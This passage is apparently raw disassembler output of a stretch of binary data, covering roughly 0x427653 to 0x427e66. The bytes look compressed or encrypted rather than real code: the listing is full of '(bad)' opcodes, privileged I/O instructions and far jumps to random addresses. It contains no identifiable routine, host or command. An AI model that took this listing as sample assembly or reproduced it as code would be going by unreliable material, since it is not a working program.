  427653:	test   DWORD PTR [ecx],eax
  427655:	mov    BYTE PTR [ebx],cl
  427657:	pop    ecx
  427658:	stos   DWORD PTR es:[edi],eax
  427659:	add    BYTE PTR [edx+0x4],ah
  42765c:	xor    al,0xf3
  42765e:	mov    eax,ds:0xd9a569a5
  427663:	and    eax,0xcc7bd278
  427668:	jnp    0x4276c6
  42766a:	dec    esi
  42766b:	test   eax,0xab42aa04
  427670:	mov    ebx,0x63fe376b
  427675:	jl     0x427683
  427677:	mov    dh,0x5b
  427679:	ret    
  42767a:	(bad)  
  42767b:	fs mov eax,0x1707419c
  427681:	sub    ch,BYTE PTR [esi]
  427683:	inc    esi
  427684:	push   esp
  427685:	hlt    
  427686:	adc    ch,BYTE PTR [edi]
  427688:	mov    dl,0x50
  42768a:	call   0xa289a8f0
  42768f:	push   0x9c2670f6
  427694:	(bad)  
  427695:	adc    eax,0xaa561eb9
  42769a:	inc    ecx
  42769b:	pop    esp
  42769c:	jmp    0xd581:0xb9667126
  4276a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276a4:	mov    ebx,DWORD PTR [eax+0x3bf1d6a8]
  4276aa:	imul   edx,DWORD PTR [edi],0xe6ec08ef
  4276b0:	fs jns 0x42767a
  4276b3:	push   esi
  4276b4:	adc    esp,ebx
  4276b6:	std    
  4276b7:	sbb    dl,dh
  4276b9:	cmp    BYTE PTR [edx-0x51d17c95],dh
  4276bf:	out    0x88,eax
  4276c1:	not    ebp
  4276c3:	retf   0x9078
  4276c6:	dec    esp
  4276c7:	fs mov dl,0xd2
  4276ca:	(bad)  
  4276cc:	cmc    
  4276cd:	inc    esp
  4276ce:	loop   0x42773d
  4276d0:	shr    edi,0x8c
  4276d3:	arpl   WORD PTR [esi],sp
  4276d5:	(bad)  [eax]
  4276d7:	test   BYTE PTR [ebx],dh
  4276d9:	mov    ebx,DWORD PTR [edi+0x0]
  4276dc:	cmp    ebx,ebp
  4276de:	jae    0x4276c2
  4276e0:	repnz adc eax,DWORD PTR [ebx]
  4276e3:	lahf   
  4276e4:	test   cl,ch
  4276e6:	dec    edx
  4276e7:	jnp    0x42775d
  4276e9:	mov    bl,0x44
  4276eb:	fisub  DWORD PTR [esp+edi*8]
  4276ee:	mov    ds:0x6dc78717,al
  4276f3:	pop    ebp
  4276f4:	test   eax,0x1cce4328
  4276f9:	out    0x5c,eax
  4276fb:	push   edi
  4276fc:	retf   
  4276fd:	xchg   esp,eax
  4276fe:	call   0x17efb8bf
  427703:	(bad)  
  427704:	sar    DWORD PTR [ecx+ebx*8-0x41d74e13],cl
  42770b:	dec    eax
  42770c:	mov    ebp,0x230576f
  427711:	mov    ds:0xcaeedd39,al
  427716:	and    eax,0x48e65883
  42771b:	xchg   esp,eax
  42771c:	cmp    ah,BYTE PTR [edx+edi*4+0x6f38a8c1]
  427723:	jne    0x4276f5
  427725:	mov    bl,0xdc
  427727:	hlt    
  427728:	mov    edx,DWORD PTR [ebp+eax*4+0x62]
  42772c:	xchg   esp,eax
  42772d:	daa    
  42772e:	mov    cl,0xbd
  427730:	sti    
  427731:	mov    al,0xc1
  427733:	cmp    DWORD PTR [edi+0x741e83cc],0x5b
  42773a:	dec    eax
  42773b:	cmp    ch,BYTE PTR ds:0xc61cc804
  427741:	aad    0xe8
  427743:	fsubr  QWORD PTR [esi]
  427745:	test   BYTE PTR [ebp-0x1a0ef785],0x54
  42774c:	mov    bl,0x81
  42774e:	add    ecx,DWORD PTR [ebp-0x3e222df2]
  427754:	sbb    al,0x3e
  427756:	sbb    DWORD PTR [ebp+0x16127011],0x2d
  42775d:	push   0xffffff91
  42775f:	pop    ecx
  427760:	add    BYTE PTR [ebx+0x10],dl
  427763:	nop
  427764:	call   0x293a8d24
  427769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42776a:	out    dx,eax
  42776b:	sbb    eax,0x2573d112
  427770:	dec    esp
  427771:	fmul   DWORD PTR [eax+eiz*4+0x274c4b34]
  427778:	mov    WORD PTR [ebp+0x73190692],?
  42777e:	push   es
  42777f:	adc    DWORD PTR [esi+edx*4+0x163aa507],edi
  427786:	xchg   DWORD PTR [ebx+0x68],ebx
  427789:	arpl   WORD PTR [ecx],bp
  42778b:	cdq    
  42778c:	rcl    edi,0xa9
  42778f:	loop   0x4277ed
  427791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427792:	into   
  427793:	out    dx,al
  427794:	push   eax
  427795:	retf   0x732f
  427798:	cld    
  427799:	dec    edx
  42779a:	int    0xb9
  42779c:	aam    0xec
  42779e:	jmp    0x5a36:0xcc8e57b
  4277a5:	pop    esp
  4277a6:	dec    edi
  4277a7:	and    al,bl
  4277a9:	adc    BYTE PTR [ecx-0x50c8956c],dl
  4277af:	jp     0x4277f6
  4277b1:	fdivr  DWORD PTR [edx-0x20]
  4277b4:	add    DWORD PTR [ebp+0x15],ebx
  4277b7:	mov    bh,0xc4
  4277b9:	jne    0x427774
  4277bb:	xchg   edx,eax
  4277bc:	imul   esi,edi,0x1
  4277bf:	(bad)  
  4277c0:	neg    bh
  4277c2:	stc    
  4277c3:	stc    
  4277c4:	imul   edi,DWORD PTR [ecx],0xffffff90
  4277c7:	xor    BYTE PTR [bx+si+0xb],ch
  4277cb:	jg     0x42779e
  4277cd:	sbb    ebp,DWORD PTR [edi+0x1d4ac584]
  4277d3:	mov    esp,0xb4ee3792
  4277d8:	mov    bh,0x1e
  4277da:	gs clc 
  4277dc:	adc    DWORD PTR [edi+0xcd4cba6],ebp
  4277e2:	xchg   esp,eax
  4277e3:	xor    al,BYTE PTR [ebx]
  4277e5:	mov    ecx,0x3a406724
  4277ea:	dec    esi
  4277eb:	cdq    
  4277ec:	mov    DWORD PTR [edx+0x31],esp
  4277ef:	clc    
  4277f0:	outs   dx,BYTE PTR ds:[esi]
  4277f1:	inc    eax
  4277f2:	inc    ebp
  4277f3:	cld    
  4277f4:	jns    0x427785
  4277f6:	icebp  
  4277f7:	sub    DWORD PTR [edx],edi
  4277f9:	jns    0x427790
  4277fb:	push   edx
  4277fc:	add    DWORD PTR [edi+0x53],eax
  4277ff:	js     0x427818
  427801:	adc    DWORD PTR [edi-0x36],ebp
  427804:	es loop 0x4277e8
  427807:	cmp    al,0xa3
  427809:	aam    0xfb
  42780b:	fwait
  42780c:	mov    eax,ds:0x64632608
  427811:	add    ch,ah
  427813:	neg    DWORD PTR ss:[edi-0x31aeab1d]
  42781a:	stos   BYTE PTR es:[edi],al
  42781b:	and    BYTE PTR ds:[ecx],dl
  42781e:	mov    gs,WORD PTR [edx]
  427820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427821:	aaa    
  427822:	lahf   
  427823:	dec    esi
  427824:	popa   
  427825:	cmp    al,0x9d
  427827:	les    eax,FWORD PTR [esi]
  427829:	sbb    DWORD PTR [esp+edx*2-0x57],ebx
  42782d:	sub    DWORD PTR [ebp-0x7e5816f2],0xae155a07
  427837:	xchg   edi,eax
  427838:	sub    dh,BYTE PTR [eax+0x20d9e7d2]
  42783e:	les    ebx,FWORD PTR [edi]
  427840:	mov    ch,0xf1
  427842:	retf   
  427843:	or     eax,0x92526a9b
  427848:	jmp    0x42785f
  42784a:	les    ebp,FWORD PTR [edi+0x55]
  42784d:	push   esi
  42784e:	jo     0x427847
  427850:	jnp    0x427800
  427852:	inc    edi
  427853:	out    dx,eax
  427854:	das    
  427855:	lahf   
  427856:	ret    0x9cfd
  427859:	clc    
  42785a:	imul   edi,eax,0x8c6140ae
  427860:	shl    BYTE PTR [esi],cl
  427862:	jl     0x42789f
  427864:	push   edi
  427865:	inc    esp
  427866:	mov    dl,0x1
  427868:	gs inc ebx
  42786a:	int    0xd2
  42786c:	(bad)  
  42786d:	push   edx
  42786e:	neg    DWORD PTR [edx+edx*8+0x3c]
  427872:	test   eax,edi
  427874:	and    eax,0x476c3845
  427879:	mov    al,0x3a
  42787b:	cmp    al,BYTE PTR [ecx+0x244b2bf7]
  427881:	daa    
  427882:	js     0x4278d3
  427884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427885:	adc    DWORD PTR [edi+0x7cbc5dea],0xc69b8c22
  42788f:	ins    BYTE PTR es:[edi],dx
  427890:	pushf  
  427891:	sub    al,0x3b
  427893:	mov    eax,0x239b2848
  427898:	loope  0x427848
  42789a:	mov    edx,0x47ffe2a
  42789f:	pop    es
  4278a0:	mov    DWORD PTR [edx],eax
  4278a2:	pop    esp
  4278a3:	jmp    0x6978:0x7df95b6d
  4278aa:	mov    cl,0x84
  4278ac:	lahf   
  4278ad:	mov    esp,0xc677167c
  4278b2:	stos   DWORD PTR es:[edi],eax
  4278b3:	clc    
  4278b4:	ror    al,1
  4278b6:	int    0xba
  4278b8:	mov    cl,0xc3
  4278ba:	cmp    dl,BYTE PTR [ecx]
  4278bc:	inc    eax
  4278bd:	leave  
  4278be:	lods   eax,DWORD PTR ds:[esi]
  4278bf:	jecxz  0x42789b
  4278c1:	mov    eax,ds:0x2be84f34
  4278c7:	cmp    DWORD PTR [eax-0x5bcae483],esi
  4278cd:	retf   
  4278ce:	fwait
  4278cf:	mov    eax,0xfa0ee4
  4278d4:	mov    BYTE PTR [ecx+0x43],dh
  4278d7:	pop    esp
  4278d8:	sbb    al,0x1b
  4278da:	fiadd  WORD PTR [ecx-0x7a]
  4278dd:	inc    ecx
  4278de:	hlt    
  4278df:	data16 sub BYTE PTR [eax+0x15135c69],dh
  4278e6:	inc    ecx
  4278e7:	mov    al,ds:0x2e1319ac
  4278ec:	out    dx,al
  4278ed:	cmp    ch,cl
  4278ef:	jne    0x427918
  4278f1:	or     eax,0xc3bb861f
  4278f6:	fidivr WORD PTR [edx]
  4278f8:	sbb    eax,0xa81b9642
  4278fd:	mov    bl,BYTE PTR [ecx+0x16f10816]
  427903:	pushf  
  427904:	sub    BYTE PTR [esi],bh
  427906:	pop    edi
  427907:	jne    0x4278bd
  427909:	jmp    0x427971
  42790b:	jl     0x427977
  42790d:	add    dl,BYTE PTR [edi]
  42790f:	mov    eax,0xa64a41c9
  427914:	add    eax,0xa104d3c2
  427919:	imul   edx,DWORD PTR [esi-0x18ed00c6],0x6c
  427920:	repz adc bh,ah
  427923:	or     BYTE PTR [edx-0x51],0x27
  427927:	icebp  
  427928:	pop    es
  427929:	ret    0x51e8
  42792c:	loop   0x4278e5
  42792e:	enter  0x423c,0x1c
  427932:	aad    0xd6
  427934:	in     eax,0x4b
  427936:	jo     0x42798c
  427938:	or     DWORD PTR [ecx+ebx*8+0x6a5388fd],ebp
  42793f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427940:	or     BYTE PTR [ecx],bl
  427942:	mov    bh,0x2a
  427944:	or     eax,0xd145cbec
  427949:	outs   dx,DWORD PTR ds:[esi]
  42794a:	push   ebx
  42794b:	mov    edi,0x4528d52f
  427950:	pop    esp
  427951:	je     0x4278fc
  427953:	push   ds
  427954:	int    0x93
  427956:	xchg   ecx,eax
  427957:	sub    al,0xb5
  427959:	sbb    bh,BYTE PTR [eax+0x1b]
  42795c:	fistp  QWORD PTR [edi+0x1f303bad]
  427962:	jle    0x427965
  427964:	jle    0x42799b
  427966:	sbb    BYTE PTR [ecx+0x28e0948a],cl
  42796c:	pop    ss
  42796d:	mov    esi,0x3d44cf2b
  427972:	bound  esp,QWORD PTR [ecx]
  427974:	xchg   edi,eax
  427975:	jne    0x4279a9
  427977:	retf   
  427978:	cdq    
  427979:	dec    ebx
  42797a:	mov    al,ds:0x9afa8493
  42797f:	sbb    DWORD PTR [ecx-0x30cfd89e],edx
  427985:	mov    eax,ebx
  427987:	lea    eax,[esi+0x3d]
  42798a:	push   es
  42798b:	test   eax,0xe0548082
  427990:	fsubr  st,st(3)
  427992:	mov    eax,0xc4839d60
  427997:	xor    BYTE PTR [ebx-0x5ab663d3],cl
  42799d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42799f:	sbb    eax,esi
  4279a1:	aaa    
  4279a2:	ss pop edx
  4279a4:	test   al,0xf0
  4279a6:	mov    ecx,DWORD PTR es:[ebp-0x4f4e0dca]
  4279ad:	scas   al,BYTE PTR es:[edi]
  4279ae:	outs   dx,BYTE PTR ds:[esi]
  4279af:	adc    esp,DWORD PTR [ecx-0x596cc836]
  4279b5:	mov    ah,0xa7
  4279b7:	pop    esi
  4279b8:	ffreep st(4)
  4279ba:	rol    BYTE PTR [edi-0x52],0x84
  4279be:	mov    ds:0xeabf4b2,al
  4279c3:	push   ebx
  4279c4:	das    
  4279c5:	xchg   esi,eax
  4279c6:	call   0x2b92:0x24d2ed7a
  4279cd:	cmp    edx,eax
  4279cf:	inc    ebp
  4279d1:	mov    edi,0xdc265ebb
  4279d6:	dec    ecx
  4279d7:	clc    
  4279d8:	or     DWORD PTR [ecx],esi
  4279da:	or     eax,0x58019f8
  4279df:	clc    
  4279e0:	add    DWORD PTR [ebp+eax*2-0x7d],ecx
  4279e4:	mov    cl,0x9b
  4279e6:	jmp    0x30485ccd
  4279eb:	cmp    eax,0x8bdfa245
  4279f0:	cmp    ebx,DWORD PTR [ecx+0x2]
  4279f3:	mov    esp,0x6666a38
  4279f9:	or     dh,cl
  4279fb:	inc    edi
  4279fc:	mov    esp,0x50812233
  427a01:	mov    ebx,0x8f004031
  427a06:	(bad)  
  427a07:	bound  edi,QWORD PTR [eax-0x7c]
  427a0a:	mov    WORD PTR [edi-0x17],cs
  427a0d:	stc    
  427a0e:	sbb    eax,0x22bfec2
  427a13:	ins    DWORD PTR es:[edi],dx
  427a14:	pushf  
  427a15:	jae    0x427a59
  427a17:	pushf  
  427a18:	ja     0x427a22
  427a1a:	push   cs
  427a1b:	push   ebp
  427a1c:	or     BYTE PTR [edx+0x72d003ea],0xb5
  427a23:	xchg   DWORD PTR [ebx+0x3e],esp
  427a26:	sbb    eax,0x5d0f75d7
  427a2b:	and    al,BYTE PTR [ebx+ebp*4+0x5bdae347]
  427a32:	push   eax
  427a33:	out    0x67,al
  427a35:	mov    ch,0x46
  427a37:	sbb    eax,0xf80b5757
  427a3c:	jg     0x427a68
  427a3e:	adc    DWORD PTR [eax+0x38a516a],0x79
  427a45:	sub    dl,BYTE PTR [ebx]
  427a47:	(bad)  
  427a48:	mov    DWORD PTR [ecx+edx*8],ecx
  427a4b:	lds    ebx,FWORD PTR [edx-0x5bdf9f7b]
  427a51:	ins    DWORD PTR es:[edi],dx
  427a52:	or     BYTE PTR [edi-0x23],bh
  427a55:	scas   al,BYTE PTR es:[edi]
  427a56:	loopne 0x427a4e
  427a58:	aaa    
  427a59:	pop    edi
  427a5a:	add    eax,0xe04e5feb
  427a5f:	jle    0x427a6d
  427a61:	ins    BYTE PTR es:[edi],dx
  427a62:	add    BYTE PTR [ebx],cl
  427a64:	lock mov eax,DWORD PTR [edx+ecx*8+0x4307889a]
  427a6c:	lods   eax,DWORD PTR ds:[esi]
  427a6d:	xchg   ebp,eax
  427a6e:	into   
  427a6f:	add    eax,0x45d9f330
  427a74:	iret   
  427a75:	adc    eax,DWORD PTR [edx+0x362ece10]
  427a7b:	cmp    BYTE PTR [ecx-0x1d],0xe1
  427a7f:	repnz mov al,ds:0x872243fe
  427a85:	push   ebp
  427a86:	jmp    0x363f:0x1a44f124
  427a8d:	pop    ebp
  427a8e:	inc    ebp
  427a8f:	pop    DWORD PTR [ebx]
  427a91:	fiadd  WORD PTR [ebx-0x78]
  427a94:	push   esi
  427a95:	in     al,0xf2
  427a97:	cld    
  427a98:	retf   
  427a99:	stc    
  427a9a:	push   es
  427a9b:	push   cs
  427a9c:	jae    0x427a3e
  427a9e:	sub    dh,BYTE PTR [ebx+0x5c731549]
  427aa4:	sbb    eax,0x27ebc59b
  427aa9:	call   0xe783:0xc19ab478
  427ab0:	sbb    bh,al
  427ab2:	xchg   edi,eax
  427ab3:	loop   0x427a40
  427ab5:	push   eax
  427ab6:	popf   
  427ab7:	mov    esi,0x30fa70ff
  427abc:	jp     0x427a7f
  427abe:	mov    eax,0xa746845e
  427ac3:	add    BYTE PTR [ebx],0x3c
  427ac6:	fcomp  QWORD PTR [ebx]
  427ac8:	add    DWORD PTR [ecx-0x35],0x36c26bf1
  427acf:	fidivr WORD PTR [esi-0x4578fe42]
  427ad5:	rcr    DWORD PTR [edx],cl
  427ad7:	ja     0x427b22
  427ad9:	xor    eax,0xc6f71506
  427ade:	xchg   edx,eax
  427adf:	ja     0x427a91
  427ae1:	and    eax,0x662651cc
  427ae6:	push   esi
  427ae7:	cmp    dl,ch
  427ae9:	sbb    bl,dh
  427aeb:	xchg   edx,eax
  427aec:	add    DWORD PTR [bx+si+0x7fa6],0x148aecdc
  427af5:	test   BYTE PTR [edi-0x288bb415],ch
  427afb:	mov    eax,0xe5d706b7
  427b00:	ret    
  427b01:	aam    0x4f
  427b03:	cmp    DWORD PTR [esi],esi
  427b05:	aad    0xab
  427b07:	int    0x4a
  427b09:	loop   0x427b3d
  427b0b:	das    
  427b0c:	mov    dl,0x1e
  427b0e:	or     ah,BYTE PTR [ebx-0x75]
  427b11:	(bad)  
  427b13:	int    0x4d
  427b15:	push   eax
  427b16:	push   edi
  427b17:	and    eax,DWORD PTR [ebx]
  427b19:	stos   DWORD PTR es:[edi],eax
  427b1a:	mov    ah,0xf4
  427b1c:	inc    ebp
  427b1d:	jmp    0x427abc
  427b1f:	xor    DWORD PTR [edi],0xd538c15d
  427b25:	and    ecx,DWORD PTR [ecx+0x55]
  427b28:	ja     0x427af7
  427b2a:	lock xchg BYTE PTR [ecx],bh
  427b2d:	fisub  WORD PTR [eax-0x7681dabc]
  427b33:	pushf  
  427b34:	mov    esp,0x2aa071d0
  427b39:	sub    esi,DWORD PTR [eax+ecx*8]
  427b3c:	clc    
  427b3d:	je     0x427b2d
  427b3f:	aas    
  427b40:	and    edx,esp
  427b42:	push   ecx
  427b43:	xor    bh,BYTE PTR [edi+0x48f3d3f3]
  427b49:	pop    es
  427b4a:	push   esp
  427b4b:	dec    ebp
  427b4c:	les    eax,FWORD PTR [eax]
  427b4e:	fiadd  DWORD PTR [edi+eax*8-0x7f7449ad]
  427b55:	rol    ecx,cl
  427b57:	mov    ecx,0x6c7b1572
  427b5c:	push   ebp
  427b5d:	dec    ecx
  427b5e:	xchg   esi,eax
  427b5f:	or     BYTE PTR [ecx+0x643df252],al
  427b65:	xor    al,0xea
  427b67:	sar    BYTE PTR [ebp-0x63],0x8c
  427b6b:	inc    eax
  427b6c:	(bad)  
  427b6d:	inc    ebp
  427b6e:	mov    WORD PTR [ecx+0x72e0712],es
  427b74:	pop    esi
  427b75:	add    bh,BYTE PTR [esi-0x16]
  427b78:	lock cmp eax,0xc57b0213
  427b7e:	cmc    
  427b7f:	sub    WORD PTR [bp+si-0x7],cx
  427b84:	sub    edx,DWORD PTR [ecx+0x3f87280]
  427b8a:	inc    ebx
  427b8b:	imul   esp,DWORD PTR [edi],0xffffff95
  427b8e:	adc    ebp,0x9463ca63
  427b94:	dec    edx
  427b95:	pop    es
  427b96:	push   esi
  427b97:	or     BYTE PTR [eax-0x64],ah
  427b9a:	pop    es
  427b9b:	in     al,dx
  427b9c:	out    0x7d,al
  427b9e:	dec    edx
  427b9f:	xor    eax,0x4a11e00a
  427ba4:	stos   BYTE PTR es:[edi],al
  427ba5:	push   edx
  427ba6:	xor    cl,BYTE PTR [edx-0x315a9f9]
  427bac:	jge    0x427b2e
  427bae:	jmp    0x427bc2
  427bb0:	shr    cl,0xba
  427bb3:	and    DWORD PTR [ebx-0x3775f7bc],0xffffffb6
  427bba:	enter  0x2ed0,0xd5
  427bbe:	cmp    dl,al
  427bc0:	push   ebp
  427bc1:	lock fnstsw WORD PTR [esi-0x27ab5822]
  427bc8:	ror    ah,cl
  427bca:	mov    al,0xa8
  427bcc:	jmp    0xe282:0x7ead73e4
  427bd3:	repnz sub ch,BYTE PTR [esi+0x7df83eff]
  427bda:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bdc:	repz out dx,eax
  427bde:	mov    dh,BYTE PTR [edi]
  427be0:	mov    bh,0x35
  427be2:	outs   dx,DWORD PTR ds:[esi]
  427be3:	(bad)  
  427be5:	and    BYTE PTR es:[ebp-0x1d],ah
  427be9:	dec    esp
  427bea:	hlt    
  427beb:	(bad)  
  427bec:	test   ebp,0x270c127f
  427bf2:	(bad)  
  427bf3:	jle    0x427c68
  427bf5:	lea    ecx,[edi+edx*4-0x4f]
  427bf9:	and    ch,cl
  427bfb:	loope  0x427c41
  427bfd:	test   al,0x8c
  427bff:	aaa    
  427c00:	addr16 jmp 0xff25ad
  427c06:	pop    ds
  427c07:	daa    
  427c08:	add    bh,BYTE PTR [esi+esi*1-0x6e]
  427c0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c0d:	or     ah,bh
  427c0f:	pusha  
  427c10:	xchg   esp,eax
  427c11:	sti    
  427c12:	jbe    0x427c48
  427c14:	loop   0x427bf8
  427c16:	imul   edx,DWORD PTR [ebp-0x6b92a942],0xffffffa1
  427c1d:	xor    ebx,edx
  427c1f:	mov    bh,0xb0
  427c21:	enter  0x15b9,0x89
  427c25:	out    dx,al
  427c26:	(bad)  
  427c27:	bound  esi,QWORD PTR [esi]
  427c29:	adc    ah,BYTE PTR [ebx+eiz*4+0x32bccf18]
  427c30:	jb     0x427bd0
  427c32:	cs aam 0x31
  427c35:	fnstenv [ebx+0x70]
  427c38:	and    al,0xe5
  427c3a:	loop   0x427be9
  427c3c:	adc    al,0x96
  427c3e:	ins    DWORD PTR es:[edi],dx
  427c3f:	gs sub esp,edx
  427c42:	mov    al,ds:0xbf4a44e3
  427c47:	xchg   ebx,eax
  427c48:	mov    dl,BYTE PTR [ecx+0x50]
  427c4b:	inc    esp
  427c4c:	lock xor BYTE PTR [ebp+0x7348955f],ah
  427c53:	pop    ds
  427c54:	mov    edi,0xecb78dff
  427c59:	inc    ecx
  427c5a:	dec    DWORD PTR [ecx+ecx*8]
  427c5d:	cld    
  427c5e:	xchg   ecx,eax
  427c5f:	mov    bl,0xf8
  427c61:	pop    esp
  427c62:	pand   mm0,QWORD PTR [ebp+0x42]
  427c66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c67:	jge    0x427cc7
  427c69:	int    0x3b
  427c6b:	pop    ss
  427c6c:	or     BYTE PTR [eax],0x35
  427c6f:	adc    esi,DWORD PTR [ebx]
  427c71:	fld    QWORD PTR [eax-0x2eb3ae9a]
  427c77:	ins    DWORD PTR es:[edi],dx
  427c78:	(bad)  
  427c79:	lock mov ebp,0xdddfe200
  427c7f:	out    0x3d,eax
  427c81:	lahf   
  427c82:	dec    ecx
  427c83:	addr16 icebp 
  427c85:	push   edi
  427c86:	mov    cl,0x3c
  427c88:	out    0xe3,al
  427c8a:	cmp    eax,0x5c795244
  427c8f:	sbb    eax,0xb36d612b
  427c94:	xor    BYTE PTR [edi-0x11],0xb1
  427c98:	icebp  
  427c99:	or     al,0xd5
  427c9b:	and    BYTE PTR [ebp+0x1e],0xd2
  427c9f:	sbb    DWORD PTR [esi-0x46],ecx
  427ca2:	int    0x3
  427ca4:	pop    ebp
  427ca5:	or     BYTE PTR [eax+esi*2],ah
  427ca8:	jmp    0x427d02
  427caa:	jg     0x8d34411e
  427cb0:	fwait
  427cb1:	rcr    DWORD PTR [edi],0x9e
  427cb4:	jge    0x427cb8
  427cb6:	stos   BYTE PTR es:[edi],al
  427cb7:	pop    ebp
  427cb8:	rol    BYTE PTR [ebx],0x57
  427cbb:	fld    QWORD PTR [esi-0x33daed11]
  427cc1:	push   edx
  427cc2:	scas   eax,DWORD PTR es:[edi]
  427cc3:	sub    DWORD PTR [edx-0x46],edx
  427cc6:	pop    ebp
  427cc7:	pop    esp
  427cc8:	pop    ebx
  427cc9:	add    ebx,0xc6cf1083
  427ccf:	jno    0x427cde
  427cd1:	inc    edi
  427cd2:	xor    al,0xc9
  427cd4:	xchg   ecx,eax
  427cd5:	mov    ebp,0x6b097965
  427cda:	stc    
  427cdb:	sub    BYTE PTR [esi-0x2a],dl
  427cde:	call   0xa426:0xf05dab9a
  427ce5:	and    al,0x9e
  427ce7:	mov    eax,0xde462436
  427cec:	or     al,0xf9
  427cee:	jne    0x427c76
  427cf0:	ss push eax
  427cf2:	and    al,0x1d
  427cf4:	loopne 0x427c9d
  427cf6:	out    dx,al
  427cf7:	mov    ch,BYTE PTR [esi+0x2b]
  427cfa:	jge    0x427cf3
  427cfc:	(bad)  
  427cfd:	fcom   DWORD PTR [edi-0x3b8dc90c]
  427d03:	fwait
  427d04:	mov    ebx,0x3c6ebe7a
  427d09:	or     al,0x3b
  427d0b:	sbb    eax,eax
  427d0d:	mov    bh,0x8
  427d0f:	jmp    0x997e9db2
  427d14:	dec    ebx
  427d15:	fdivr  DWORD PTR [eax-0x5c]
  427d18:	lahf   
  427d19:	rcr    BYTE PTR [ecx+0x71134152],0x30
  427d20:	sbb    al,0xd7
  427d22:	popa   
  427d23:	retf   0x78a9
  427d26:	push   esp
  427d27:	stos   DWORD PTR es:[edi],eax
  427d28:	inc    edi
  427d29:	push   cs
  427d2a:	aaa    
  427d2b:	mov    ebp,0xbd558dc1
  427d30:	adc    ah,BYTE PTR [edx-0x68e2ed9c]
  427d36:	cmp    ah,BYTE PTR [eax-0x45]
  427d39:	adc    DWORD PTR [ecx],0xada168de
  427d3f:	mov    WORD PTR [eax+0x6ba941dd],es
  427d45:	jmp    0x8317:0x57568df9
  427d4c:	push   eax
  427d4d:	adc    eax,0x16ed8a96
  427d52:	not    BYTE PTR [edx]
  427d54:	cli    
  427d55:	test   DWORD PTR [ebx-0x49d6e2cf],esp
  427d5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d5c:	sub    al,0xc1
  427d5e:	mov    ebp,0x18e9d226
  427d63:	lods   al,BYTE PTR ds:[esi]
  427d64:	jbe    0x427dad
  427d66:	xor    esp,ebp
  427d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d69:	jp     0x427d06
  427d6b:	adc    dl,dl
  427d6d:	ret    0xa76f
  427d70:	jnp    0x427d3a
  427d72:	pop    ss
  427d73:	mov    ebx,0x2c553af8
  427d78:	mov    ch,0x36
  427d7a:	xchg   edx,eax
  427d7b:	adc    DWORD PTR [esi],esp
  427d7d:	call   0x25222fca
  427d82:	push   ss
  427d83:	inc    eax
  427d84:	pop    esp
  427d85:	bound  esp,QWORD PTR [esi-0x797dac75]
  427d8b:	xor    al,0xe3
  427d8e:	fisub  DWORD PTR ds:0xfdd4dc5e
  427d94:	and    eax,0x82ccc901
  427d99:	adc    al,0xa6
  427d9b:	imul   esi,DWORD PTR [esi],0xa4c414ce
  427da1:	xchg   edx,eax
  427da2:	popa   
  427da3:	(bad)  
  427da4:	mov    dl,0x21
  427da6:	fcom   QWORD PTR [esi]
  427da8:	and    DWORD PTR [ebx-0x20d23bdd],esp
  427dae:	mov    al,0x17
  427db0:	pop    edi
  427db1:	mov    edi,0x72e9c458
  427db6:	xchg   ebx,ebp
  427db8:	inc    edx
  427db9:	sub    DWORD PTR [edi+0x69],ecx
  427dbc:	scas   al,BYTE PTR es:[edi]
  427dbd:	and    al,0xe3
  427dbf:	scas   al,BYTE PTR es:[edi]
  427dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427dc1:	lea    edx,[ebx+0x54]
  427dc4:	in     eax,dx
  427dc5:	xchg   edx,eax
  427dc6:	stos   BYTE PTR es:[edi],al
  427dc7:	cli    
  427dc8:	or     eax,0x824d2a77
  427dcd:	push   edi
  427dce:	pop    ebp
  427dcf:	jle    0x427e2b
  427dd1:	pushf  
  427dd2:	pop    edi
  427dd3:	ret    
  427dd4:	jmp    0x1e45431b
  427dd9:	dec    esi
  427dda:	xchg   al,dh
  427ddc:	repz std 
  427dde:	adc    BYTE PTR [esi+0x2884554b],ah
  427de4:	xor    eax,0x821cec5
  427de9:	push   eax
  427dea:	mov    ds:0x10feccdd,al
  427def:	repnz cmp ah,ah
  427df2:	popf   
  427df3:	adc    ebp,esi
  427df5:	sub    al,0x9
  427df7:	ds and ax,0xe1e0
  427dfc:	call   0x6792:0x940c6287
  427e03:	sbb    bh,0x5d
  427e06:	addr16 int3 
  427e08:	pusha  
  427e09:	mov    dh,BYTE PTR [eax]
  427e0b:	out    0x2e,al
  427e0d:	cdq    
  427e0e:	mov    bl,0x92
  427e10:	cmp    eax,0x8faa1bbb
  427e15:	push   es
  427e16:	lock xchg ebp,eax
  427e18:	jo     0x427e2e
  427e1a:	pop    edi
  427e1b:	or     ebp,eax
  427e1d:	push   eax
  427e1e:	and    edi,edx
  427e20:	sub    edx,DWORD PTR [ecx-0x60]
  427e23:	sbb    eax,0xfe3a5989
  427e28:	inc    ecx
  427e29:	jmp    0xbe308c2a
  427e2e:	jmp    0xd96:0xa648b17b
  427e35:	icebp  
  427e36:	mov    esp,0xc7880304
  427e3b:	adc    ebx,DWORD PTR [eax]
  427e3d:	and    eax,0x1ae39c61
  427e42:	sub    esi,esp
  427e44:	xchg   edi,eax
  427e45:	mov    dh,0x5a
  427e47:	clc    
  427e48:	push   DWORD PTR [esi]
  427e4a:	dec    ebx
  427e4b:	js     0x427e00
  427e4d:	stos   BYTE PTR es:[edi],al
  427e4e:	scas   eax,DWORD PTR es:[edi]
  427e4f:	inc    ecx
  427e50:	mov    ah,0xe4
  427e52:	jbe    0x427ece
  427e54:	clc    
  427e55:	pop    eax
  427e56:	ds xchg bh,ch
  427e59:	(bad)  
  427e5a:	xchg   ebp,eax
  427e5b:	ficom  DWORD PTR [esp+edx*8+0x2b3d4541]
  427e62:	mov    bl,al
  427e64:	sbb    al,0xfd
  427e66:	daa    
